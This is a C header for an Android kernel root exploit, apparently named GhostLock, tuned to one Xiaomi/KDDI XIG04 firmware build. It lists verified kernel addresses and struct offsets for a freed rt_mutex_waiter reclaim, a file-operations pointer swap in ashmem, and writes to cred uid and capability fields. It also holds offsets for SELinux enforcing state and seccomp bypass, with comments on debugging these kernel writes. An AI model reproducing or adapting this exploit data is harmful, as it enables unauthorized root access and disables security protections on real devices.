#ifndef TARGET_H
#define TARGET_H

/* aristotle (au/KDDI XIG04, MT6895, Android 12, kernel 5.10.136-android12-9).
 * Generated from the oppo-ghostlock (5.10.236) target.h template; device values
 * replaced with aristotle MEASURED kallsyms + gdb-verified struct offsets.
 * NOTE: (1) P0_KERNEL_PHYS_LOAD delta=0 CONFIRMED (vendor_boot kernel_addr==/memory base==0x40000000, Image flags bit3=0, text_offset=0);
 * (2) qemu-gdb VERIFIED: TASK_COMM 0x790, TASK_PID 0x5c8, TASK_TGID 0x5cc,
 *     TASK_TASKS 0x4c8, TASK_REAL_CRED 0x778, TASK_CRED 0x780, task_group 0x310,
 *     CRED_CAPS 0x30, selinux_state 0x2a25b90. Still UNVERIFIED (root stage only):
 *     TASK_REAL_PARENT/ATOMIC_FLAGS/SECCOMP, CRED_UID (needs non-root task), and
 *     pipe/fops/struct_page offsets — kept from oppo, verify via qemu/ before root.
 * (3) SLIDE_RANDOM_BOOT_ID_DATA from the popsicle-era measurement (verify). */

#define BUILD_VARIANT_LABEL "aristotle_V14.0.3.0.TMFJPKD_12.0"
#define BUILD_FINGERPRINT "Xiaomi/XIG04_jp_kdi/XIG04:12/SP1A.210812.016/V14.0.3.0.TMFJPKD:user/release-keys"

/* 39-bit VA: CONFIG_ARM64_VA_BITS=39 */
#define KIMAGE_TEXT_BASE 0xffffffc010000000ULL  /* vmlinux-to-elf _text */
#define P0_PAGE_OFFSET 0xffffff8000000000ULL   /* 39-bit VA direct map */
#define P0_PHYS_OFFSET 0x40000000ULL
#define P0_KERNEL_PHYS_LOAD 0x40000000ULL      /* delta 0 CONFIRMED: vendor_boot kernel_addr==/memory base==0x40000000; Image flags bit3=0 (fixed load @DRAM base), text_offset=0 */
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL  /* 39-bit VA direct map start */
#define KERNELSNITCH_IDENTITY_END 0xffffffc000000000ULL    /* 39-bit VA direct map end (16GB) */
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffffc000000000ULL               /* 39-bit VA: 16GB direct map */
#define VMEMMAP_START 0xfffffffe00000000ULL                /* 39-bit VA vmemmap */

/* -2: aligns the fake waiter (table starts at word 2 = stack_fds+0x10) with the
 * freed rt_mutex_waiter, which QEMU/disasm frame-summing places at the SAME
 * kernel-stack address as core_sys_select's stack_fds (both SP_DIV-0x210). So
 * the waiter base must be stack_fds+0 -> shift word 2 down to long 0 = -2.
 * See RTMUTEX_WALK_DISASM_ANALYSIS.md "Reclaim alignment". Floor is -2 (word 0
 * = tree_pc must stay >= 0). */
#define PSELECT_WAITER_WORD_SHIFT -2

/* 符号偏移 (IDA MCP verified from miscdevice + fops structure) */
/* ASHMEM_MISC_FOPS = &ashmem_misc.fops (the POINTER field misc_open reads to set
 * file->f_op), so the GhostLock write *ashmem_misc_fops=fake_fops actually swaps
 * the fops. Kernel scan: ashmem_misc (struct miscdevice) @ 0x28c6670, its .fops
 * field @ +0x10 = 0x28c6680 holds &ashmem_fops (0xffffffc01229d120). Was wrongly
 * set to 0x229d120 (the ashmem_fops TABLE itself) — writing fake_fops there only
 * clobbered ashmem_fops.owner, the fd kept the real fops (write_iter=NULL) so
 * FMODE_CAN_WRITE was never set -> pwrite EINVAL(22). */
#define ASHMEM_MISC_FOPS_OFF 0x028c6680ULL   /* &ashmem_misc.fops (miscdevice+0x10) */
#define ASHMEM_FOPS_OFF 0x0229d120ULL         /* ashmem_fops TABLE (for leak_kernel_base + restore value) */
#define ASHMEM_IOCTL_OFF 0x011a37d8ULL        /* ✓ IDA: func entry sub_11EE6EC */
#define ASHMEM_COMPAT_IOCTL_OFF 0x011a4328ULL /* ✓ IDA: func entry sub_11EE7D0 */
#define ASHMEM_MMAP_OFF 0x011a4388ULL         /* ✓ IDA: func entry sub_11EE7D0 (same as compat_ioctl in this binary) */
#define ASHMEM_OPEN_OFF 0x011a45d0ULL         /* ✓ IDA: func entry sub_11EF340 */
#define ASHMEM_RELEASE_OFF 0x011a4670ULL      /* ✓ IDA: func entry sub_11EF580 */
#define ASHMEM_SHOW_FDINFO_OFF 0x011a4794ULL  /* ✓ IDA: func entry sub_11EF620 */
#define CONFIGFS_READ_ITER_OFF 0x006b4794ULL  /* ✓ IDA: func entry sub_6B038C */
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x02157220ULL /* ✓ IDA: func entry sub_6B050C */
#define COPY_SPLICE_READ_OFF 0x005c18a4ULL    /* ✓ IDA: func entry sub_5E6830 */
#define NOOP_LLSEEK_OFF 0x0054684cULL         /* ✓ IDA: func entry sub_56CF68 (exact match) */
#define INIT_TASK_OFF 0x0277bf80ULL          /* ✓ vmlinux-to-elf nm */
#define INIT_UTS_NS_OFF 0x0277bd28ULL        /* ✓ vmlinux-to-elf nm */
#define EMPTY_ZERO_PAGE_OFF 0x02971000ULL    /* ✓ vmlinux-to-elf nm */
#define ROOT_TASK_GROUP_OFF 0x02976040ULL    /* ✓ vmlinux-to-elf nm */
#define SELINUX_BLOB_SIZES_OFF 0x022df670ULL /* ✓ vmlinux-to-elf nm */
#define SELINUX_STATE_OFF 0x02a25b90ULL      /* ✓ vmlinux-to-elf nm */
#define SELINUX_ENFORCING_OFF 0x02a25b90ULL  /* ✓ vmlinux-to-elf nm */
#define SECURITY_HOOK_HEADS_OFF 0x022defe0ULL /* ✓ vmlinux-to-elf nm */
#define KMALLOC_CACHES_OFF 0x022deb18ULL     /* ✓ vmlinux-to-elf nm */
#define ANON_PIPE_BUF_OPS_OFF 0x0214c128ULL  /* ✓ IDA output.elf verified */
#define INIT_NET_OFF 0x028cfc40ULL           /* ✓ vmlinux-to-elf nm */
#define INIT_NSPROXY_OFF 0x027907d0ULL       /* ✓ vmlinux-to-elf nm */

#define ASHMEM_MISC_FOPS (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define INIT_UTS_NS (KIMAGE_TEXT_BASE + INIT_UTS_NS_OFF)
#define EMPTY_ZERO_PAGE (KIMAGE_TEXT_BASE + EMPTY_ZERO_PAGE_OFF)
#define ROOT_TASK_GROUP (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_STATE (KIMAGE_TEXT_BASE + SELINUX_STATE_OFF)
#define SELINUX_ENFORCING (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SECURITY_HOOK_HEADS (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* SLIDE 偏移 */
#define SLIDE_NFULNL_LOGGER_OFF 0x02771380ULL
#define SLIDE_LOGGERS_0_1_OFF 0x02771380ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02886cf8ULL
#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF 0x02886cf8ULL

#define SLIDE_NFULNL_LOGGER_IMAGE (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

#define WAITER_LOCAL_OFF 0x50  /* kernel 5.10: rt_mutex_waiter 80 bytes */
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_WAKE_STATE_OFF -1  /* kernel 5.10: 无此字段 */
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48
#define WAITER_WW_CTX_OFF -1  /* kernel 5.10: 无此字段 */

#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF -1  /* kernel 5.10: 无此字段 */
#define FAKE_WAITER_WW_CTX_OFF -1  /* kernel 5.10: 无此字段 */

#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_PI_LOCK_OFF 0x86c
#define FAKE_TASK_PI_WAITERS_OFF 0x880
#define FAKE_TASK_PI_TOP_TASK_OFF 0x890
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x898

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

#define MM_OWNER_OFF 1032
#define TASK_PID_OFF 0x5c8   /* gdb-verified: init pid=1 @0x5c8 (was 0x618 oppo) */
#define TASK_TGID_OFF 0x5cc   /* gdb-verified: init tgid=1 @0x5cc */
#define TASK_REAL_PARENT_OFF 0x5d8   /* qemu-gdb: init_task+0x5d8 == &init_task (self-ptr); layout pid0x5c8/tgid0x5cc/canary0x5d0/real_parent0x5d8 (unused in code, kept correct) */
#define TASK_ATOMIC_FLAGS_OFF 0x5d8   /* KNOWN-WRONG placeholder: 0x5d8 is real_parent, not atomic_flags. Could not locate true offset in QEMU (init atomic_flags==0). NNP-clear at this ptr is a benign no-op (bit0 already 0); not required for root. TODO verify on device. */
#define TASK_REAL_CRED_OFF 0x778
#define TASK_CRED_OFF 0x780
#define TASK_COMM_OFF 0x790
#define TASK_TASKS_OFF 0x4c8   /* gdb-verified: tasks list -> comm="init" (was 0x550 oppo) */
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8e8   /* UNVERIFIED: init_task reads 0/0/0 here (consistent but not proof; needs a task with seccomp). Carried from oppo; other task offsets differ so treat as suspect. */
#define TASK_PI_BLOCKED_ON_OFF 0x898   /* ✓ IDA verified: rt_mutex_adjust_prio_chain LDR X28, [X19,#0x898] */

/* cred layout — qemu-gdb verified against init_cred @0xffffffc012790930.
 * CAP_FULL(0x000001ffffffffff) run lands at 0x30/0x38/0x40 = permitted/effective/bset,
 * so cap_inheritable=0x28, securebits=0x24, uid=0x04 (standard 5.10, usage=4B).
 * Previous values (8/40/48) were +4 too high: uid write skipped real uid(0x04),
 * and the 5-word cap write overflowed into cred->user(0x50). */
#define CRED_UID_OFF 4          /* was 8 (that was gid); qemu-gdb: uid@0x04 */
#define CRED_SECUREBITS_OFF 36  /* 0x24; was 40/0x28 (that was cap_inheritable) */
#define CRED_CAPS_OFF 40        /* 0x28 = cap_inheritable start; was 48/0x30 (permitted) -> 5-word write clobbered cred->user */
#define CRED_SECURITY_OFF 128   /* 0x80; qemu-gdb: holds a kernel ptr (selinux blob) */
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10
#define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
#define PIPE_INODE_INFO_SIZE 0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF 0x60
#define PIPE_TAIL_OFF 0x64
#define PIPE_MAX_USAGE_OFF 0x68
#define PIPE_RING_SIZE_OFF 0x6c
#define PIPE_NR_ACCOUNTED_OFF 0x70
#define PIPE_READERS_OFF 0x74
#define PIPE_WRITERS_OFF 0x78
#define PIPE_FILES_OFF 0x7c
#define PIPE_TMP_PAGE_OFF 0x90
#define PIPE_BUFS_OFF 0xa8
#define PIPE_USER_OFF 0xb0

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc0
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
